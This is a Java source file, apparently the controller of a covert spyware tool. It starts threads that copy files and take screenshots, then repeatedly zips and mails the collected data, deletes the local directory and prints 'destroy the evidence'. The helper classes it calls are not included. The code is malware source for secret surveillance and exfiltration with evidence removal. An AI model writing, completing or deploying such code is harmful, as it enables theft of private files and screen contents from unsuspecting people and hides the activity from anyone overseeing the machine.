

public class Controller {
	
	public static void main(String args[]){
		
		
	//start the thread to copy files as tHe agent runs. 
			Thread f = new Thread(new CopyFiles());
			System.out.println("running copier");
			f.start();
			
	//start the thread to take screencaps
			Thread c = new Thread(new Check());
			System.out.println("running screecapper");
			c.start();
	
	 		
	while(true){
		try {
			Thread.sleep(100000);
		} catch (InterruptedException e) {
			// TODO Auto-generated catch block
			e.printStackTrace();
		}
	///mail me the result
		System.out.println("trying to mail");
			Mail2 m = new Mail2();
			m.zipandmail();
			System.out.println("mailem");
	//Delete the Directory
			DeleteDirectory d = new DeleteDirectory();
			d.Delete();
			
			
			System.out.println("destroy the evidence");
	//wait  ten minutes
	try {
		Thread.sleep(100000);
	} catch (InterruptedException e) {
		// TODO Auto-generated catch block
		e.printStackTrace();
	}
	}
	}
}
